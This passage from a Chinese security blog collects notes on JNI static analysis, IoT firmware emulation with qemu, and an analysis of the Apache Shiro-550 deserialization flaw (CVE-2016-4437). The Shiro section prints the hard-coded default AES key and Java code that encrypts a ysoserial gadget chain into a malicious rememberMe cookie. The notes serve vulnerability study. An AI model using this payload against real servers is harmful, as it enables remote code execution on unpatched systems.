          <a href="#Java-Native-Interface-JNI" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java-Native-Interface-JNI" class="headerlink" title="Java Native Interface (JNI)"></a>Java Native Interface (JNI)</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318160018163.png" alt="image-20230318160018163"></p>
<p>用来和相关动态链接库进行交互的编程框架，比如<code>JAVA</code>就可以调用到<code>C/C++</code>编写的动态链接库，即为<code>JNI</code>框架</p>

        <h3 id="Why-Native-Code-is-Hard-to-Analyze"   >
          <a href="#Why-Native-Code-is-Hard-to-Analyze" class="heading-link"><i class="fas fa-link"></i></a><a href="#Why-Native-Code-is-Hard-to-Analyze" class="headerlink" title="Why Native Code is Hard to Analyze?"></a>Why Native Code is Hard to Analyze?</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318162255276.png" alt="image-20230318162255276"></p>
<p>在<code>JNI</code>例子中，首先加载动态链接库，声明函数。其中<code>*env</code>变量用来传递<code>JAVA</code>中相关的一些信息，可以在<code>Native Code</code>中创建对象、属性、调用<code>JAVA</code>中的方法等。主要问题是跨语言之后，如何静态分析<code>je.guessMe()</code>这个调用?</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/1ca6e11b1e72" >【课程笔记】南大软件分析课程12——Soundiness（课时16） - 简书 (jianshu.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>因为<code>Native Code</code>是在库里面了，其源代码基本没有，只有一个接口库文件<code>.so/.dll</code>，那么就比较难进行分析了。</p>

        <h3 id="How-to-Handle-Native-Code"   >
          <a href="#How-to-Handle-Native-Code" class="heading-link"><i class="fas fa-link"></i></a><a href="#How-to-Handle-Native-Code" class="headerlink" title="How to Handle Native Code?"></a>How to Handle Native Code?</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318162203276.png" alt="image-20230318162203276"></p>
<p>手动建模分析</p>

        <h4 id="Native-Code-Modeling-Example"   >
          <a href="#Native-Code-Modeling-Example" class="heading-link"><i class="fas fa-link"></i></a><a href="#Native-Code-Modeling-Example" class="headerlink" title="Native Code Modeling (Example)"></a>Native Code Modeling (Example)</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318163010673.png" alt="image-20230318163010673"></p>
<p>直接将对应的函数简化成<code>JAVA</code>代码来进行分析，相当于<code>hook</code>掉相关的<code>API</code>，然后用类似功能的<code>JAVA</code>代码来替换掉。</p>

        <h4 id="前沿"   >
          <a href="#前沿" class="heading-link"><i class="fas fa-link"></i></a><a href="#前沿" class="headerlink" title="前沿"></a>前沿</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318163145075.png" alt="image-20230318163145075"></p>
<p>前沿的一些分析，此外可以参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://soundiness.org进行深入研究./" >http://soundiness.org进行深入研究。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="总结-10"   >
          <a href="#总结-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-10" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318163231858.png" alt="image-20230318163231858"></p>
<p>理解<code>Soundiness</code>的大概概念，以及<code>JAVA</code>反射机制和<code>Native Code</code>为什么比较难分析。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/01/05/IOT%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">IOT环境搭建</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-01-05</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-10-14</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、固件处理"   >
          <a href="#一、固件处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、固件处理" class="headerlink" title="一、固件处理"></a>一、固件处理</h1>
      
        <h2 id="1-获取"   >
          <a href="#1-获取" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-获取" class="headerlink" title="1.获取"></a>1.获取</h2>
      <p>要么提取，要么从官网下载</p>

        <h2 id="2-解包"   >
          <a href="#2-解包" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-解包" class="headerlink" title="2.解包"></a>2.解包</h2>
      <p>一般常用<code>binwalk</code>，有时候可能涉及加密、获取组件相关问题</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://lantern.cool/CVE-d-link-dir-815/#%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96" >D-Link DIR-815 路由器多次溢出漏洞分析 | Lantern’s 小站</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="二、环境搭建"   >
          <a href="#二、环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1>
      
        <h2 id="1-简单启动"   >
          <a href="#1-简单启动" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-简单启动" class="headerlink" title="1.简单启动"></a>1.简单启动</h2>
      <p><code>IOT</code>相关的基本都是涉及嵌入式，不同架构，常见有<code>arm、mips</code>等，以<code>mips</code>为例子</p>
<p>参考：[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-272318.htm#msg_header_h2_4" >原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>一般用<code>qemu</code>加上对应架构的**<code>linux</code>内核<strong>和</strong>文件系统**来启动，比如如下脚本</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-mipsel \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> \</span><br><span class="line">	-nographic</span><br></pre></td></tr></table></div></figure>

<p>就可以启动一个系统</p>

        <h2 id="2-网络配置"   >
          <a href="#2-网络配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-网络配置" class="headerlink" title="2.网络配置"></a>2.网络配置</h2>
      <p>最好的肯定是模拟真实的环境，那模拟真实环境肯定就需要涉及到相关网络问题，这里就需要用到<code>qemu</code>一些网络的配置，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/OnlyLove_/article/details/124536607" >(46条消息) Linux 内核调试 七：qemu网络配置_lqonlylove的博客-CSDN博客_qemu 网络配置</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>结合一下，大概如下</p>
<ul>
<li><p>宿主机新建<code>tap</code>网络</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ip tuntap add dev tap0 mode tap</span><br><span class="line">sudo ip link <span class="built_in">set</span> dev tap0 up</span><br><span class="line">sudo ip address add dev tap0 192.168.2.128/24</span><br></pre></td></tr></table></div></figure>

<p>这样就会出现如下网络后端</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221202190656170.png" alt="image-20221202190656170"></p>
</li>
<li><p>然后如下启动脚本，加入网络配置</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-mipsel \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> \</span><br><span class="line">    -net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">	-nographic</span><br></pre></td></tr></table></div></figure></li>
<li><p>启动之后，在<code>qemu</code>中设置相关<code>IP</code>地址，然后启用</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip addr add 192.168.2.129/24 dev eth0</span><br><span class="line">ip link <span class="built_in">set</span> eth0 up</span><br></pre></td></tr></table></div></figure>

<p>这样就可以有<code>IP</code>地址了，当然这些<code>IP</code>地址都是自己设置的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221202191218116.png" alt="image-20221202191218116"></p>
<p>这样就宿主机和<code>qemu</code>虚拟机就可以连通了，之后就是相关的服务启动了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221202191300164.png" alt="image-20221202191300164"></p>
</li>
</ul>

        <h2 id="3-常见配置"   >
          <a href="#3-常见配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-常见配置" class="headerlink" title="3.常见配置"></a>3.常见配置</h2>
      <p>很多的<code>IOT</code>都是<code>squashfs</code>这个文件系统，<code>binwalk</code>解包出来会有一个<code>squashfs-root</code>文件夹，然后我们可以将该文件系统通过<code>scp</code>拷贝进启动的<code>qemu</code>虚拟机，之后进行简单的设置即可</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">scp -r ./squashfs-root root@ip:/root/</span><br><span class="line"></span><br><span class="line"><span class="comment">#进入qemu虚拟机，挂载系统的proc固件目录下的proc,防止程序在访问内核信息时找不到相关的而运行错误</span></span><br><span class="line">mount --<span class="built_in">bind</span> /proc squashfs-root/proc</span><br><span class="line"></span><br><span class="line"><span class="comment">#更换一下root目录,为文件系统的相关链接库做准备</span></span><br><span class="line">chroot . bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#然后还需要改一下软连接、软路由啥的,比如DIR-645的漏洞,就需要创建一些软连接,如下</span></span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动服务就行</span></span><br><span class="line">/usr/bin/httpd -f http_conf</span><br></pre></td></tr></table></div></figure>




        <h1 id="三、CGI配置"   >
          <a href="#三、CGI配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、CGI配置" class="headerlink" title="三、CGI配置"></a>三、CGI配置</h1>
      <p>很多时候的嵌入式<code>Web</code>页面都是用<code>CGI</code>的，所以可以稍微学习一下相关<code>CGI</code>。</p>

        <h2 id="1-环境搭建"   >
          <a href="#1-环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h2>
      <p>这里就选择<code>ubuntu</code>自带的<code>mini-httpd</code>服务</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install mini-httpd</span><br></pre></td></tr></table></div></figure>

<p>然后相关的配置在<code>/etc/mini-httpd.conf</code>，主要关注如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207103833732.png" alt="image-20221207103833732"></p>
<p>相关端口也是设置好</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207103738798.png" alt="image-20221207103738798"></p>
<p>然后需要在数据目录，即<code>/var/www/html</code>下新建<code>cgi-bin</code>目录，然后把相关<code>CGI</code>程序放到该<code>cgi-bin</code>目录下即可。</p>

        <h2 id="2-启动服务"   >
          <a href="#2-启动服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-启动服务" class="headerlink" title="2.启动服务"></a>2.启动服务</h2>
      <p>如下，设置一下启动配置文件即可运行了</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mini_httpd -C /etc/mini-httpd.conf</span><br></pre></td></tr></table></div></figure>

<p>然后即可访问到默认界面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207104046784.png" alt="image-20221207104046784"></p>

        <h2 id="3-编写CGI"   >
          <a href="#3-编写CGI" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-编写CGI" class="headerlink" title="3.编写CGI"></a>3.编写<code>CGI</code></h2>
      <p><code>CGI</code>和正常<code>C</code>程序是一样的，直接编译之后放到对应<code>cgi-bin</code>目录下即可，比如如下程序</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207104240311.png" alt="image-20221207104240311"></p>
<p>编译如下</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ./test.c -static -o test.cgi</span><br></pre></td></tr></table></div></figure>

<p>访问效果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207104257725.png" alt="image-20221207104257725"></p>
<p>这里需要注意要直接<code>printf</code>显示出来的话，需要设置相关的<code>html</code>格式，这里即可先进行了</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>( <span class="string">&quot;Content-Type: text/plain\r\n\r\n&quot;</span> );</span><br></pre></td></tr></table></div></figure>

<p>之后即可自己写一些<code>CGI</code>来玩耍了。</p>
<p>感觉<code>CGI</code>的很多的不安全性就是在于直接运行了一个可执行程序，而该可执行程序大多都是用<code>C</code>语言编写的，安全性可想而知。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/10/22/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/">WEB中间件漏洞</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-10-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="Shiro"   >
          <a href="#Shiro" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h1>
      
        <h2 id="1-Shiro-550"   >
          <a href="#1-Shiro-550" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Shiro-550" class="headerlink" title="1.Shiro-550"></a>1.Shiro-550</h2>
      <p>对应<code>CVE-2016-4437</code></p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/op3c7v#823652d0" >Shiro 550 漏洞学习（一） (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="1-利用版本"   >
          <a href="#1-利用版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-利用版本" class="headerlink" title="(1)利用版本"></a>(1)利用版本</h3>
      <p><code>1.2.4</code>及以下</p>

        <h3 id="2-漏洞原理"   >
          <a href="#2-漏洞原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞原理" class="headerlink" title="(2)漏洞原理"></a>(2)漏洞原理</h3>
      <p><code>Apache Shiro</code>框架提供了记住密码功能，登录成功的话会将用户的登录信息进行经过<code>AES</code>加密然后<code>base64</code>编码，放在<code>Cookie</code>的<code>rememberMe</code>字段，大致如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122090810999.png" alt="image-20221122090810999"></p>
<p>那么在服务端就会对该<code>rememberMe</code>字段进行<code>base64</code>解码，然后<code>AES</code>解密，最后再反序列化，如果我们构造恶意的<code>rememberMe</code>字段，这样就会导致反序列化的<code>RCE</code>漏洞。同时，由于<code>AES</code>加解密的<code>KEY</code>是硬编码写在源码中的，我们可以直接获得。</p>

        <h3 id="3-漏洞环境"   >
          <a href="#3-漏洞环境" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-漏洞环境" class="headerlink" title="(3)漏洞环境"></a>(3)漏洞环境</h3>
      
        <h4 id="简单搭建"   >
          <a href="#简单搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#简单搭建" class="headerlink" title="简单搭建"></a>简单搭建</h4>
      <ul>
<li><code>vulhub</code>：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub" >vulhub/vulhub: Pre-Built Vulnerable Environments Based on Docker-Compose (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
</ul>

        <h4 id="源码构建Shiro"   >
          <a href="#源码构建Shiro" class="heading-link"><i class="fas fa-link"></i></a><a href="#源码构建Shiro" class="headerlink" title="源码构建Shiro"></a>源码构建<code>Shiro</code></h4>
      <p>参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46127592/article/details/123999749" >(48条消息) shiro debug 调试_scanner010的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<ul>
<li><p>下载源码：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/apache/shiro" >apache/shiro: Apache Shiro (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>然后换成<code>1.2.4</code>：<code>git checkout shiro-root-1.2.4</code></p>
</li>
<li><p><code>jstl</code>版本切换</p>
<p>打开<code>shiro/samples/web/pom.xml</code>，更换<code>jstl</code>版本</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122092207371.png" alt="image-20221122092207371"></p>
<p>之后重新<code>reload</code>一下即可</p>
</li>
<li><p><code>Tomcat</code>部署</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122092453428.png" alt="image-20221122092453428"></p>
<p>然后配置一下<code>Web</code>界面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122092527995.png" alt="image-20221122092527995"></p>
<p>如下添加即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122092557904.png" alt="image-20221122092557904"></p>
<p>之后运行或调试即可</p>
</li>
</ul>

        <h3 id="4-漏洞流程分析"   >
          <a href="#4-漏洞流程分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-漏洞流程分析" class="headerlink" title="(4)漏洞流程分析"></a>(4)漏洞流程分析</h3>
      <p><code>rememberMe</code>解析流程</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AbstractRememberMeManager.getRememberedPrincipals</span><br><span class="line">CookieRememberMeManager.getRememberedSerializedIdentity  //获取Cookie中的remember字段,并且进行base64解码</span><br><span class="line"></span><br><span class="line">AbstractRememberMeManager.convertBytesToPrincipals</span><br><span class="line">AbstractRememberMeManager.decrypt</span><br><span class="line">AbstractRememberMeManager.deserialize</span><br><span class="line"></span><br><span class="line">DefaultSerializer.deserialize</span><br></pre></td></tr></table></div></figure>

<p>大致图解如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122114903998.png" alt="image-20221122114903998"></p>

        <h3 id="5-漏洞代码分析"   >
          <a href="#5-漏洞代码分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-漏洞代码分析" class="headerlink" title="(5)漏洞代码分析"></a>(5)漏洞代码分析</h3>
      <ul>
<li><p><code>AbstractRememberMeManager.getRememberedPrincipals</code></p>
<p>当一个涉及到用户信息的请求来时，首先是进入<code>rememberMe</code>管理函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122115116077.png" alt="image-20221122115116077"></p>
</li>
<li><p><code>CookieRememberMeManager.getRememberedSerializedIdentity</code></p>
<p>在<code>AbstractRememberMeManager.getRememberedPrincipals</code>函数中调用<code>getRememberedSerializedIdentity</code>尝试获取<code>base64</code>解码后的<code>rememberMe</code>字段</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122120445903.png" alt="image-20221122120445903"></p>
</li>
<li><p><code>AbstractRememberMeManager.convertBytesToPrincipals</code></p>
<p>随即调用<code>convertBytesToPrincipals</code>函数进行后续操作</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122120543984.png" alt="image-20221122120543984"></p>
<ul>
<li><p><code>AbstractRememberMeManager.decrypt</code></p>
<p><code>convertBytesToPrincipals</code>函数中调用到<code>decrypt</code>函数，通过<code>getDecryptionCipherKey</code>获取密钥尝试对<code>base64</code>解码后的<code>Cookie</code>进行<code>AES</code>解密</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122120725908.png" alt="image-20221122120725908"></p>
<p>一层一层撸下来，如下所示，可以在<code>AbstractRememberMeManager</code>中找到对应的硬编码的<code>key</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] getDecryptionCipherKey() &#123;</span><br><span class="line">    <span class="keyword">return</span> decryptionCipherKey;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDecryptionCipherKey</span><span class="params">(<span class="keyword">byte</span>[] decryptionCipherKey)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.decryptionCipherKey = decryptionCipherKey;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCipherKey</span><span class="params">(<span class="keyword">byte</span>[] cipherKey)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//Since this method should only be used in symmetric ciphers</span></span><br><span class="line">    <span class="comment">//(where the enc and dec keys are the same), set it on both:</span></span><br><span class="line">    setEncryptionCipherKey(cipherKey);</span><br><span class="line">    setDecryptionCipherKey(cipherKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AbstractRememberMeManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.serializer = <span class="keyword">new</span> DefaultSerializer&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="keyword">this</span>.cipherService = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>AbstractRememberMeManager.deserialize</code></p>
<p>解密完成之后，回到<code>AbstractRememberMeManager.convertBytesToPrincipals</code>函数中即进行反序列化</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122121659679.png" alt="image-20221122121659679"></p>
<p>调用到了<code>DefaultSerializer.deserialize</code>来完成最后的反序列化过程</p>
</li>
</ul>
</li>
</ul>

        <h3 id="6-漏洞利用"   >
          <a href="#6-漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-漏洞利用" class="headerlink" title="(6)漏洞利用"></a>(6)漏洞利用</h3>
      <p>即将我们的恶意反序列化链进行相关编码加密，在登录时勾选<code>rememberMe</code>，然后抓包设置为<code>rememberMe</code>字段发送到服务器即可，常用的链条为<code>CC1</code>，<code>CC6</code>，<code>CC10</code>，<code>cc11</code></p>
<ul>
<li><p>相关<code>POC</code></p>
<p>使用<code>ysoserial</code>生成序列化链条<code>cc1</code>然后编码加密即可。</p>
</li>
</ul>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shiroDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;/home/hacker/Desktop/WEB/JAVA/JavaThings/cc11&quot;</span>));</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h3 id="7-漏洞检测"   >
          <a href="#7-漏洞检测" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-漏洞检测" class="headerlink" title="(7)漏洞检测"></a>(7)漏洞检测</h3>
      <ul>
<li><p><code>dnslog</code></p>
</li>
<li><p><code>key</code>检测</p>
<p><code>key</code>正确则显示<code>deleteMe</code>，反之则显示<code>deleteMe</code></p>
</li>
</ul>

        <h3 id="8-漏洞修复"   >
          <a href="#8-漏洞修复" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-漏洞修复" class="headerlink" title="(8)漏洞修复"></a>(8)漏洞修复</h3>
      <p>官方修复是<code>key</code>的随机生成</p>

        <h2 id="2-Shiro-721"   >
          <a href="#2-Shiro-721" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Shiro-721" class="headerlink" title="2.Shiro-721"></a>2.Shiro-721</h2>
      <p>这个就先不复现了，比较没有实用价值</p>

        <h1 id="Tomcat"   >
          <a href="#Tomcat" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1>
      
        <h2 id="1-内存马"   >
          <a href="#1-内存马" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-内存马" class="headerlink" title="1.内存马"></a>1.内存马</h2>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/kd35na#74f91dcf" >Tomcat 内存马学习(一)：Filter型 (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>这个不能算漏洞，只能算一种写木马的方式吧</p>
